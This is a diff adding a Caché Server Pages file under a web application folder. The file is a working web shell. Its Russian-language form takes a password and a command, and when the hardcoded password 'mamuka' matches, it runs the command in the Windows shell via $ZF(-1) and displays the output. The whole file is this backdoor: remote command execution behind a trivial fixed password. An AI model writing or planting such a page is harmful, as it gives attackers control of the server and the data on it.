@@ -1,0 +1,27 @@
+<script language="cache" runat="server">
+ s password=%request.Get("password")
+ s command=%request.Get("command")
+ if password="mamuka" do
+ . d $ZF(-1,command_" > c:\cachesys\csp\sklad2\lastresult.txt")
+ . s string="Выполнили команду "_command_" <br>"
+ . s file=##class(%File).%New("c:\cachesys\csp\sklad2\lastresult.txt")
+ . d file.Open("S")
+ . f  s str=file.Read(2000) q:str=""  d
+ . . s string=string_$zcvt(str,"I","CP866")_"<br>"
+ else  s string="Неверный пароль"
+</script>
+<html>
+<head>
+<title>	Выполнение команд командного процессора windows </title>
+
+</head>
+
+<body>
+<form>
+#($G(string))#<br>
+Пароль <input type="text" name="password"><br>
+Команда <input type="text" name="command" size=120><br>
+<input type="submit" value="ok">
+</form>
+</body>
+</html>
